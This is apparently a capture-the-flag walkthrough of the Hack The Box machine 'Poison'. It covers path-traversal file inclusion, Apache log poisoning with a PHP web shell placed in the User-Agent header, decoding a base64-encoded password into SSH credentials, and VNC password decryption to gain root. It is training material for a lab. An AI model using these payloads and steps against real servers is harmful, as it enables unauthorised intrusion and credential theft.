
```
22/tcp open  ssh
80/tcp open  http
Enumerating open ports...
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-04 14:29 EDT
Nmap scan report for poison.htb (10.10.10.84)
Host is up (0.041s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (FreeBSD 20161230; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
|_  256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((FreeBSD) PHP/5.6.32)
|_http-server-header: Apache/2.4.29 (FreeBSD) PHP/5.6.32
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

# foothold solution 1
- /browse.php?file=info.php
```
FreeBSD Poison 11.1-RELEASE FreeBSD 11.1-RELEASE #0 r321309: Fri Jul 21 02:08:28 UTC 2017 root@releng2.nyi.freebsd.org:/usr/obj/usr/src/sys/GENERIC amd64
```
- browse.php?file=listfiles.php
```
Array ( [0] => . [1] => .. [2] => browse.php [3] => index.php [4] => info.php [5] => ini.php [6] => listfiles.php [7] => phpinfo.php [8] => pwdbackup.txt ) 
```
let check pwdbackup.txt out, it looks juicy
```
This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
Ukd4RVdub3dPVU5uUFQwSwo= 
```
let decode it by using cyberchef using python. I create python script just for fun. and here is the decoded credential
```console
kurohat$ python3 b64decode.py 
b'Charix!2#4%6&8(0'
```
ssh charix:Charix!2#4%6&8(0 and run linpeas.sh
# foothold solution 2
After I rooted poison, I wounder why this box call `poison` when it didnt even involve poisoning of any type... So I when back to the first step and poke poison a bit more...

I know that there are many type of poisoning tachnic such as arp poisoning, log poisoning. It this case, it cant be arp poisoning since we are not hacking network. So it leave us to log poisoning. For log poisoning to work, we need to be able to read log. Let check if we have Local File Inclusion (LFI) on poison.


let visit `browse.php?file=../../../../../etc/passwd` hopefully it will give use `/etc/passwd`. Bingo !!! it works. so now let try to access apache log file for BSD. After goolging, I found out that appache log is locate at `/var/log/httpd-access.log`, so lets try to request for the log file. `browse.php?file=../../../../../var/log/httpd-access.log`

It works, as you can se here
```
[06/Oct/2020:21:40:03 +0200] "GET /browse.php?file=../../../../../etc/passwd HTTP/1.1" 200 1894 "-" 
"Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" 
```
As you can see, User-agent is save in the log. The plan is we gonna poison the apache log by changing User-agent to something malicious such as, php code, which get be execute when we try to access the log file via LFI. Now open burp and put the following php code as User-agent. Read more about it [here](https://www.hackingarticles.in/apache-log-poisoning-through-lfi/)
```
<?php system($_GET['cmd']); ?>
```
now visit `browse.php?file=../../../../../var/log/httpd-access.log`
```
[06/Oct/2020:22:05:47 +0200] "GET /browse.php?file=info.php HTTP/1.1" 200 157 "-" "
Warning: system(): Cannot execute a blank command in /var/log/httpd-access.log on line 10
" 
```

okey it work, now let try to request things such as, ls -la , cat, by visiting `httpd-access.log&cmd=ls -a` 

so let get the **pwdbackup.txt** by visiting `/browse.php?file=../../../../../var/log/httpd-access.log&cmd=cat%20pwdbackup.txt`
```
06/Oct/2020:22:05:47 +0200] "GET /browse.php?file=info.php HTTP/1.1" 200 157 "-" "This password is secure, it's encoded atleast 13 times.. what could go wrong really.. Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0 NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO Ukd4RVdub3dPVU5uUFQwSwo=
```

# root
interesting files
```
/home/charix/user.txt
/home/charix/secret.zip
```
active ports
```
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp4       0      0 localhost.smtp         *.*                    LISTEN
tcp4       0      0 *.http                 *.*                    LISTEN
tcp6       0      0 *.http                 *.*                    LISTEN
tcp4       0      0 *.ssh                  *.*                    LISTEN
tcp6       0      0 *.ssh                  *.*                    LISTEN
tcp4       0      0 localhost.5801         *.*                    LISTEN
tcp4       0      0 localhost.5901         *.*                    LISTEN
```
2 open ports, 5801 and 5901

so let do ssh port forwarding, I learn from ippsec that you can do something so call SSH "Konami Code" (SSH Control Sequences) link [here](https://www.sans.org/blog/using-the-ssh-konami-code-ssh-control-sequences/)


I use proxyfroxy to forward the web traffic to the victim 5801 and 5901 but it didnt work, so I end up searching for more clue, and then I found this link from [hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-vnc). it seem like `VNC` defualt port are 5800, 5801, 5900, 5901. let verify by runing this command
```console
charix@Poison:~ % ps -aux | grep vnc
root     529   0.0  0.9  23620  8900 v0- I    20:17     0:00.03 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/
charix 15832   0.0  0.2  14828  2372  1  S+   22:54     0:00.00 grep vnc
```
BINGO, it is runing VNC, so let follow hacktricks and find out more what


so I assume that the secret.zip should be the a password or something, since I can open on the remote server, I use scp to copy it and crack it with `zip2john`, Luckly I tried it with charix's password and it works!! 
```console
kali@kali:~/HTB/poison$ scp charix@poison.htb:/home/charix/secret.zip secret.zip
Password for charix@Poison:
secret.zip                                                               100%  166     4.1KB/s   00:00    
kali@kali:~/HTB/poison$ unzip secret.zip 
Archive:  secret.zip
[secret.zip] secret password: 
 extracting: secret  
```
seem like it is a encrypted password, Hacktrick mentioned how to decrypt it by using https://github.com/jeroennijhof/vncpwd 
```console
kali@kali:~/HTB/poison$ git clone https://github.com/jeroennijhof/vncpwd.git
Cloning into 'vncpwd'...
remote: Enumerating objects: 28, done.
remote: Total 28 (delta 0), reused 0 (delta 0), pack-reused 28
Unpacking objects: 100% (28/28), 22.13 KiB | 70.00 KiB/s, done.
kali@kali:~/HTB/poison$ cd vncpwd/
kali@kali:~/HTB/poison/vncpwd$ make
gcc -Wall -g -o vncpwd vncpwd.c d3des.c
kali@kali:~/HTB/poison/vncpwd$ ls
d3des.c  d3des.h  LICENSE  Makefile  README  vncpwd  vncpwd.c
kali@kali:~/HTB/poison/vncpwd$ ./vncpwd ../secret
Password: VNCP@$$!
```
we will use proxychain to pass our vnc traffic to posion:5901. let start by checking proxychain configureation
```console
kali@kali:~/HTB/poison/vncpwd$ tail /etc/proxychains.conf
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```
defualt at `9050` okey, back to charix ssh. we change port forwarding to 9050 instead. now let use `vncviewer` to gain root
```console
kali@kali:~/HTB/poison/vncpwd$ proxychains vncviewer 127.0.0.1:5901
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-127.0.0.1:5901-<><>-OK
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Password: 
Authentication successful
Desktop name "root's X desktop (Poison:1)"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Same machine: preferring raw encoding
```

Boom we rooted the box!